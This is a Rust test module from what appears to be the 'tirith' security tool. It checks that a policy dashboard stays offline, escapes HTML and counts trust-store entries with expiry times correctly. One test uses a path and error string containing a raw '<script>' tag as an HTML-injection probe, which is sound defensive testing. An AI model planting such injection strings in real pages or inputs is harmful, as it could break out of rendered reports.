        // CodeRabbit M13 PR #132 R9-2: the dashboard is a local, offline
        // reporting surface (its embedded report states it "makes no network
        // calls"). `build_policy_summary` must therefore reflect the LOCAL
        // effective policy WITHOUT a remote fetch, even when a policy server is
        // configured via `TIRITH_SERVER_URL` + `TIRITH_API_KEY` (or the local
        // file). It must complete (no hang / network error) and surface local
        // data — never a fetched / fail-closed remote result.
        //
        // The control: the local file sets `policy_fetch_fail_mode: closed` and
        // the env names an UNREACHABLE server. `Policy::discover` would, with
        // this exact setup, fail closed and yield `paranoia: None` (the error
        // state). Observing the LOCAL `paranoia: 3` instead proves no fetch
        // branch ran — `build_policy_summary` took the offline path.
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let isolated_config = tempfile::tempdir().unwrap();
        let cfg = isolated_config.path().as_os_str();
        // Pin config resolution at the isolated dir on every OS (XDG +
        // %APPDATA%/%LOCALAPPDATA% + HOME/USERPROFILE) so the developer's real
        // config is never read, clear TIRITH_POLICY_ROOT, and name a bogus,
        // unreachable policy server. If the dashboard ever called
        // `fetch_remote_policy`, this would (best case) flip the summary to the
        // fail-closed/error state and (worst case) hang on a connect. The guard
        // restores every value on drop.
        let _env = DashboardEnvGuard::apply(&[
            ("XDG_CONFIG_HOME", Some(cfg)),
            ("APPDATA", Some(cfg)),
            ("LOCALAPPDATA", Some(cfg)),
            ("HOME", Some(cfg)),
            ("USERPROFILE", Some(cfg)),
            (
                "TIRITH_SERVER_URL",
                Some(std::ffi::OsStr::new("http://127.0.0.1:1")),
            ),
            ("TIRITH_API_KEY", Some(std::ffi::OsStr::new("bogus-key"))),
        ]);

        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".git")).unwrap();
        std::fs::create_dir_all(repo.path().join(".tirith")).unwrap();
        std::fs::write(
            repo.path().join(".tirith/policy.yaml"),
            "paranoia: 3\nfail_mode: closed\npolicy_fetch_fail_mode: closed\n",
        )
        .unwrap();

        // Must return promptly and reflect the LOCAL policy — no remote fetch.
        let summary = build_policy_summary(Some(repo.path().to_str().unwrap()));

        assert!(
            summary.error.is_none(),
            "offline discovery must NOT surface a network/fetch error: {summary:?}"
        );
        assert_eq!(
            summary.paranoia,
            Some(3),
            "the LOCAL paranoia must be reflected; a remote fetch would have \
             failed closed and yielded None: {summary:?}"
        );
        assert_eq!(
            summary.fail_mode.as_deref(),
            Some("closed"),
            "the LOCAL fail_mode must be reflected, not a fetched/remote value: {summary:?}"
        );

        // `_env` restores the full env set on drop — no manual cleanup needed.
    }

    #[test]
    fn render_policy_shows_unavailable_for_broken_policy_escaped() {
        // The error state renders an explicit "unavailable" notice (not fake
        // defaults), and both the path and the parse error are HTML-escaped so a
        // hostile path / error string cannot break out of the report.
        let p = PolicySummary {
            paranoia: None,
            fail_mode: None,
            allowlist_count: None,
            allowlist_rules_count: None,
            blocklist_count: None,
            custom_rules_count: None,
            path: Some("/repo/.tirith/<script>.yaml".into()),
            error: Some("yaml parse error: did not find expected <node>".into()),
        };
        let html = render_policy(&p);
        assert!(
            html.contains("Policy unavailable"),
            "the broken-policy state must say it is unavailable: {html}"
        );
        assert!(
            html.contains("yaml parse error"),
            "the parse error must be surfaced: {html}"
        );
        // No fake defaults leaked into the broken-policy rendering.
        assert!(
            !html.contains("Paranoia tier"),
            "a broken policy must NOT render the numeric default block"
        );
        // HTML-escaped path + error (no raw <script>).
        assert!(
            html.contains("&lt;script&gt;"),
            "path must be escaped: {html}"
        );
        assert!(
            !html.contains("<script>"),
            "no raw <script> may appear: {html}"
        );

        // Sanity: a normal (no-error) summary still renders the numeric block.
        let ok = PolicySummary {
            paranoia: Some(2),
            fail_mode: Some("closed".into()),
            allowlist_count: Some(1),
            allowlist_rules_count: Some(0),
            blocklist_count: Some(0),
            custom_rules_count: Some(0),
            path: None,
            error: None,
        };
        let html = render_policy(&ok);
        assert!(html.contains("Paranoia tier"));
        assert!(html.contains("closed"));
        assert!(!html.contains("Policy unavailable"));
    }

    #[test]
    fn count_trust_entries_handles_missing_and_expired() {
        let dir = tempfile::tempdir().unwrap();
        // Missing file → 0.
        assert_eq!(count_trust_entries(&dir.path().join("nope.json")), 0);

        // A store with one permanent, one future, one past entry → 2 non-expired.
        let path = dir.path().join("trust.json");
        let store = serde_json::json!({
            "version": 1,
            "entries": [
                {"pattern": "a", "added": "x", "source": "s"},
                {"pattern": "b", "added": "x", "source": "s", "ttl_expires": "2999-01-01T00:00:00+00:00"},
                {"pattern": "c", "added": "x", "source": "s", "ttl_expires": "2000-01-01T00:00:00+00:00"}
            ]
        });
        std::fs::write(&path, serde_json::to_string(&store).unwrap()).unwrap();
        assert_eq!(count_trust_entries(&path), 2);

        // A corrupt file → 0 (degrade gracefully, never panic).
        std::fs::write(&path, "{ not json").unwrap();
        assert_eq!(count_trust_entries(&path), 0);
    }

    #[test]
    fn count_trust_entries_treats_malformed_ttl_as_inactive() {
        // CodeRabbit M13 PR #132 R3-2: an entry whose `ttl_expires` cannot be
        // parsed must NOT be counted as active — that would overstate the live
        // trust surface relative to runtime enforcement (which skips malformed
        // timestamps). Here: one permanent (active) + one garbage-TTL (inactive)
        // → exactly 1 counted.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("trust.json");
        let store = serde_json::json!({
            "version": 1,
            "entries": [
                {"pattern": "ok", "added": "x", "source": "s"},
                {"pattern": "bad", "added": "x", "source": "s", "ttl_expires": "not-a-timestamp"}
            ]
        });
        std::fs::write(&path, serde_json::to_string(&store).unwrap()).unwrap();
        assert_eq!(
            count_trust_entries(&path),
            1,
            "a permanent entry counts; an entry with an unparseable ttl_expires must NOT"
        );
    }

    #[test]
    fn count_trust_entries_counts_ttl_equal_to_now_as_active() {
        // CodeRabbit M13 PR #132 R17-2: the dashboard boundary must match runtime
        // enforcement. `Policy::merge_trust_store` only expires an entry when
        // `expiry < now`, so `ttl_expires == now` is still ACTIVE. Pin the
        // comparison instant so the `>= now` (not `> now`) boundary is exercised
        // deterministically: an entry timestamped EXACTLY at `now` must count, and
        // one a microsecond earlier must NOT.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("trust.json");
        let now = chrono::Utc::now();
        let at_now = now.to_rfc3339();
        let just_past = (now - chrono::Duration::microseconds(1)).to_rfc3339();
        let store = serde_json::json!({
            "version": 1,
            "entries": [
                {"pattern": "now", "added": "x", "source": "s", "ttl_expires": at_now},
                {"pattern": "past", "added": "x", "source": "s", "ttl_expires": just_past}
            ]
        });
        std::fs::write(&path, serde_json::to_string(&store).unwrap()).unwrap();
        assert_eq!(
            count_trust_entries_at(&path, now),
            1,
            "ttl_expires == now is active (>= now); ttl_expires just before now is expired"
        );
    }
}
